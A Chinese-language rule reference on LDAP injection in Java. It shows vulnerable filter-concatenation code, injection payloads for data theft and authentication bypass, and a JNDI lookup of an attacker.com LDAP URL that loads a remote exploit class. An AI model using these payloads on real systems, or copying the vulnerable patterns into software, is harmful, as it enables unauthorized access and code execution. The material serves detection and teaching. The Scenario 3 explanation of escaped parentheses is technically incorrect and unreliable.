# Java语言LDAP注入漏洞

> 规则 ID：`other_any_ldapi` · 类别：ldapi · 关键 sink：DirContext, InitialDirContext, search
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


### Java语言LDAP注入漏洞
LDAP（轻量级目录访问协议）是用于访问和维护分布式目录信息服务的应用层协议，广泛应用于身份认证、用户信息存储等场景。Java中通过JNDI（Java命名和目录接口）操作LDAP服务时，若未对用户输入进行严格校验，攻击者可构造恶意输入注入LDAP查询语句，篡改查询逻辑、窃取敏感数据甚至执行恶意代码，这就是**LDAP注入漏洞**。

#### 一、LDAP注入的核心原理
LDAP查询基于“过滤器（Filter）”语法，例如查询用户名为“admin”的用户：`(uid=admin)`。LDAP过滤器有固定语法规则（如括号、逻辑运算符`&`/`|`/`!`、通配符`*`等），若用户输入直接拼接进过滤器字符串，攻击者可通过注入特殊字符破坏原有语法，构造恶意过滤器，达到越权查询、绕过认证等目的。

Java中常见的LDAP操作方式（如`InitialDirContext.search()`）接收拼接后的过滤器字符串作为参数，这是漏洞产生的核心场景——输入未净化导致过滤器被篡改。

#### 二、LDAP注入的关键语法基础
理解LDAP过滤器语法是分析注入的前提，核心语法规则：
1. 过滤器格式：`(属性名=属性值)`，例如`(mail=user@example.com)`；
2. 逻辑组合：`&(条件1)(条件2)`（与）、`|(条件1)(条件2)`（或）、`!(条件)`（非）；
3. 通配符：`*`匹配任意字符（如`(uid=adm*)`匹配uid以adm开头的用户）；
4. 特殊字符：`(`、`)`、`*`、`\`、`\0`等为LDAP保留字符，需转义（如`\28`表示`(`，`\29`表示`)`）。

#### 三、Java中LDAP注入的典型场景及案例
Java操作LDAP的核心API是`javax.naming.ldap`包（如`InitialLdapContext`、`LdapContext`），结合JNDI实现查询、绑定等操作，不同业务场景下的注入方式不同：

##### 场景1：简单查询注入（无逻辑运算符）
**业务场景**：根据用户输入的用户名查询用户信息，代码直接拼接过滤器：
```java
// 危险代码：用户输入直接拼接LDAP过滤器
String username = request.getParameter("username"); // 攻击者可控输入
String filter = "(uid=" + username + ")"; // 拼接过滤器
SearchControls controls = new SearchControls();
controls.setSearchScope(SearchControls.SUBTREE_SCOPE);
NamingEnumeration<SearchResult> results = ctx.search("ou=users,dc=example,dc=com", filter, controls);
```
**注入攻击**：
- 攻击者输入：`admin)(&`，拼接后过滤器变为：`(uid=admin)(&)`。LDAP解析时，`(uid=admin)`为有效条件，`(&)`为空的与逻辑，最终查询所有uid=admin的用户（甚至因语法兼容，可能返回所有用户）；
- 攻击者输入：`*`，拼接后过滤器为`(uid=*)`，直接返回所有用户的uid信息，导致敏感数据泄露；
- 攻击者输入：`admin*`，拼接后为`(uid=admin*)`，匹配所有以admin开头的用户（如admin1、admin2）。

##### 场景2：认证绕过（含逻辑运算符的过滤器）
**业务场景**：登录认证时，拼接“用户名+密码”的组合过滤器，验证用户合法性：
```java
// 危险代码：认证逻辑拼接用户名和密码
String username = request.getParameter("username");
String password = request.getParameter("password");
// 原逻辑：同时满足uid=用户名 和 userPassword=密码
String filter = "(& (uid=" + username + ") (userPassword=" + password + "))";
NamingEnumeration<SearchResult> results = ctx.search("ou=users,dc=example,dc=com", filter, controls);
if (results.hasMore()) {
    // 认证通过
}
```
**注入攻击**：
- 攻击者输入用户名：`admin)(|(userPassword=*))`，密码任意（如123），拼接后过滤器变为：
  `(& (uid=admin)(|(userPassword=*)) (userPassword=123))`；
  LDAP解析逻辑：`uid=admin` 且 `(userPassword=* 或 userPassword=123)`，由于`userPassword=*`匹配所有密码，最终认证绕过；
- 更简化的注入：用户名输入 `*)(&`，密码输入 `*)`，拼接后过滤器变为 `(& (uid=*)(&) (userPassword=*))`，直接匹配所有用户，完全绕过认证。

##### 场景3：带转义但不完整的注入
**业务场景**：开发人员尝试转义部分特殊字符，但未覆盖全部，例如仅转义`(`：
```java
String username = request.getParameter("username");
// 不完整的转义：仅替换(，未处理)、*、\等
username = username.replace("(", "\\28");
String filter = "(uid=" + username + ")";
```
**注入攻击**：
- 攻击者输入：`admin)\29(|(userPassword=*))`，拼接后过滤器为：
  `(uid=admin)\29(|(userPassword=*)))`；
  LDAP中`\29`是`)`的转义形式，解析后等价于`(uid=admin)(|(userPassword=*))`，依然触发注入。

##### 场景4：JNDI-LDAP远程代码执行（特殊注入延伸）
这是LDAP注入的高危变种，结合JNDI的特性，攻击者可构造恶意LDAP服务器，诱导Java客户端加载远程类，执行任意代码（JDK 1.8u191前存在该漏洞）。
**业务场景**：代码中通过用户输入拼接JNDI URL，初始化LDAP上下文：
```java
// 危险代码：用户输入拼接JNDI URL
String ldapUrl = request.getParameter("url"); // 攻击者输入：ldap://attacker.com:1389/Exploit
InitialContext ctx = new InitialContext();
ctx.lookup(ldapUrl); // 触发远程类加载
```
**注入攻击**：
- 攻击者搭建恶意LDAP服务器，返回包含恶意类的引用（如`javax.naming.Reference`指向`http://attacker.com/Exploit.class`）；
- Java客户端执行`lookup`时，会加载并实例化该恶意类，导致代码执行（如执行系统命令、写入文件等）。

##### 场景5：多属性组合查询注入
**业务场景**：查询条件包含多个属性（如用户名+邮箱），拼接逻辑更复杂：
```java
String username = request.getParameter("username");
String email = request.getParameter("email");
String filter = "(& (uid=" + username + ") (mail=" + email + "))";
```
**注入攻击**：
- 攻击者输入用户名：`admin)(&`，邮箱：`*)`，拼接后过滤器变为：
  `(& (uid=admin)(&) (mail=*))`，等价于`(uid=admin) & (mail=*)`，返回所有admin用户的邮箱信息；
- 若注入逻辑运算符：用户名输入 `*)(|(mail=*))`，邮箱任意，过滤器变为 `(& (uid=*)(|(mail=*)) (mail=xxx))`，返回所有用户的邮箱信息。

#### 四、LDAP注入的触发条件
1. **输入可控**：用户输入（如参数、表单、URL）可直接或间接拼接进LDAP过滤器/JNDI URL；
2. **无有效过滤**：未对LDAP保留字符（`(`、`)`、`*`、`\`、`\0`、`&`、`|`、`!`）进行全量转义；
3. **LDAP操作权限过高**：LDAP客户端拥有查询/修改敏感数据的权限（如读取所有用户信息、修改密码）；
4. **JNDI配置不安全**：Java客户端开启了JNDI的远程类加载功能（JDK默认配置，低版本未修复）。

#### 五、LDAP注入的危害等级
- **低危**：仅泄露非敏感数据（如公开的用户昵称）；
- **中危**：泄露敏感数据（如用户密码哈希、邮箱、手机号）；
- **高危**：绕过认证（如管理员登录）、篡改LDAP数据（如修改用户权限）；
- **极危**：远程代码执行（JNDI-LDAP注入）、服务器被接管。

#### 六、易被忽视的LDAP注入场景
1. **间接输入注入**：用户输入并非直接拼接，而是存储到数据库/缓存后，再读取拼接进LDAP过滤器；
2. **批量查询注入**：批量导入用户数据时，未校验导入数据中的特殊字符，导致批量注入；
3. **日志注入**：用户输入被写入日志，后续日志分析程序读取日志拼接LDAP查询，触发注入；
4. **嵌套过滤器注入**：过滤器嵌套多层逻辑（如`&(|(条件1)(条件2))(条件3)`），注入点隐藏在嵌套层级中。

综上，Java中的LDAP注入本质是“未净化的用户输入破坏LDAP过滤器语法”，其危害随业务场景和LDAP权限不同而差异极大，核心风险点集中在输入拼接、特殊字符未转义、JNDI不安全配置三个维度。

